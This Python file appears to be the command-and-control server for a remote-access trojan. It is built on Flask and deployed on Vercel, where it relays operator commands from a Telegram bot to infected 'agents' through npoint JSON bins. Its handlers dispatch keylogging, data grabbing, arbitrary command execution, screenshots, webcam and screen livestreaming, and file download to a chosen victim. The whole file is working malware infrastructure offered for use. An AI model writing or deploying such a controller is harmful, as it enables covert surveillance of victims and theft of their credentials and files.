# api/index.py
# This is the new Vercel-compatible controller using Flask and Webhooks.

import os
import json
import uuid
import requests
from flask import Flask, request

from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- Configuration ---
# These will be set as Environment Variables in Vercel's settings.
TOKEN = os.getenv("TELEGRAM_TOKEN")
JOBS_URL = os.getenv("JOBS_URL")  # Your first npoint bin for agent jobs
STATE_URL = os.getenv("STATE_URL") # Your second npoint bin for storing the target

# Initialize the Flask web server
app = Flask(__name__)

# Initialize the Telegram bot application (we won't run polling)
ptb_app = Application.builder().token(TOKEN).build()

# --- Helper Functions for State and Jobs ---

def get_state():
    """Reads the current selected_target from the state bin."""
    try:
        res = requests.get(STATE_URL, timeout=5)
        return res.json().get("selected_target", None)
    except Exception:
        return None

def set_state(target_id):
    """Writes the new selected_target to the state bin."""
    try:
        requests.post(STATE_URL, json={"selected_target": target_id}, timeout=5)
    except Exception as e:
        print(f"Error setting state: {e}")

def post_job(target_id, command, args):
    """Posts a command to the jobs bin for agents to pick up."""
    job = {"job_id": str(uuid.uuid4()), "target_id": target_id, "command": command, "args": args}
    try:
        requests.post(JOBS_URL, json=job, timeout=5)
        return True
    except Exception as e:
        print(f"Error posting job: {e}")
        return False

# --- Telegram Command Handlers ---

async def cmd_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Sets the target agent ID by writing it to the state bin."""
    target_id = " ".join(context.args).lower() if context.args else None
    if not target_id:
        current_target = get_state() or "None"
        await update.message.reply_text(f"Current target: {current_target}\nUsage: /target <id|all|clear>")
        return
    
    if target_id == 'clear':
        set_state(None)
        await update.message.reply_text("Target cleared.")
    else:
        set_state(target_id)
        await update.message.reply_text(f"Target set to: {target_id}")

async def generic_command_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles all other commands by posting them as jobs."""
    selected_target = get_state()
    if not selected_target:
        await update.message.reply_text("No target selected. Use /target first.")
        return

    command = update.message.text.split(' ')[0][1:]
    args = " ".join(context.args)
    
    if post_job(selected_target, command, args):
        await update.message.reply_text(f"Job '{command}' dispatched to target '{selected_target}'.")
    else:
        await update.message.reply_text("Error: Failed to dispatch job.")

# --- Register handlers with the python-telegram-bot application ---
ptb_app.add_handler(CommandHandler("target", cmd_target))

agent_commands = ["info", "startkeylogger", "stopkeylogger", "grab", "exec", "ss", "cam", "livestream", "stoplivestream", "livecam", "stoplivecam", "ls", "cd", "pwd", "download"]
for cmd in agent_commands:
    ptb_app.add_handler(CommandHandler(cmd, generic_command_handler))

# --- Main Webhook Endpoint ---
# This is the function Vercel will run when Telegram sends a message.
@app.route('/', methods=['POST'])
async def process_webhook():
    update_data = request.get_json()
    update = Update.de_json(update_data, ptb_app.bot)
    await ptb_app.process_update(update)
    return 'OK', 200

# This is a simple health-check endpoint you can visit in your browser
@app.route('/', methods=['GET'])
def health_check():
    return "Flask controller is running.", 200
